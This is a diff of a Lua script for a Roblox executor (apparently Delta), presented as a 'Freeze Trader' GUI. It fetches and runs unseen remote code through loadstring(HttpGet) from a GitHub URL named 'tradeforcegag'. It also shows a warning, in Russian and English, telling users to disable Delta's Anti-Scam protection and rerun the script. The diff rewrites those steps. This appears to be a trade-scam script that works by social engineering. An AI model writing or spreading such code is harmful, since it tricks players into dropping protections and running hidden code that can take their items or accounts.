@@ -4,11 +4,12 @@ if type(Delta) == "table" or type(_G.Delta) == "table" then
     isDelta = true
 end
 
--- 🔹 Флаги
+-- 🔹 Флаги для предотвращения повторного открытия
 if not _G.FreezeTraderLoaded then
     _G.FreezeTraderLoaded = true
 
     local function startMainGUI()
+        -- Здесь идёт весь твой Freeze Trader (GUI, окна, кнопки и т.д.)
         local Players = game:GetService("Players")
         local TweenService = game:GetService("TweenService")
         local UserInputService = game:GetService("UserInputService")
@@ -402,8 +403,10 @@ Players.PlayerAdded:Connect(function() updatePlayersList() end)
 Players.PlayerRemoving:Connect(function() updatePlayersList() end)
 
 updatePlayersList()
+
     end
 
+    -- Функция запуска TradeForce
     local function startTradeForce()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/daniklevik/gag/refs/heads/main/tradeforcegag"))()
     end
@@ -412,7 +415,7 @@ updatePlayersList()
         if not _G.DeltaWarningShown then
             _G.DeltaWarningShown = true
 
-            -- Код таблички Delta...
+            -- Создание таблички Delta
             local Players = game:GetService("Players")
             local LocalizationService = game:GetService("LocalizationService")
             local player = Players.LocalPlayer or Players.PlayerAdded:Wait()
@@ -421,12 +424,12 @@ updatePlayersList()
 
             local messages = {
                 ["ru"] = {
-                    title = "⚠️ Скрипт требует функцию, но она заблокирована нашей системой Delta.\n\nЕсли вы хотите активировать:\n1) В настройках Delta отключите параметр Anti-Scam\n2) Поставьте ✔ и нажмите Окей",
+                    title = "⚠️ Скрипт требует функцию, но она заблокирована нашей системой Delta.\n\nЕсли вы хотите активировать:\n1) Перезайдите в режим\n2) В настройках Delta отключите параметр Anti-Scam\n3) Повторно запустите скрипт",
                     checkbox = "Я отключил функцию Anti-Scam",
                     button = "Окей"
                 },
                 ["en"] = {
-                    title = "⚠️ The script requires the teleport function, but it is currently blocked by Delta's Anti-Scam system.\n\nTo enable this function:\n1) Open Delta settings and disable Anti-Scam\n2) Press ✔ and Ok",
+                    title = "⚠️ The script requires the teleport function, but it is currently blocked by Delta's Anti-Scam system.\n\nTo enable this function:\n1) Rejoin the place (leave and rejoin)\n2) Open Delta settings and disable Anti-Scam\n3) Execute the script again",
                     checkbox = "I have disabled the Anti-Scam function",
                     button = "OK"
                 }
@@ -525,13 +528,12 @@ updatePlayersList()
             okBtn.MouseButton1Click:Connect(function()
                 if checked then
                     frame.Visible = false
-                    startMainGUI()      -- запускаем Freeze Trader
-                    startTradeForce()   -- и сразу после него TradeForce
+                    startMainGUI()
                 end
             end)
         end
     else
-        -- Delta нет — запускаем оба сразу
+        -- Если Delta нет — запускаем сразу оба скрипта
         startMainGUI()
         startTradeForce()
     end
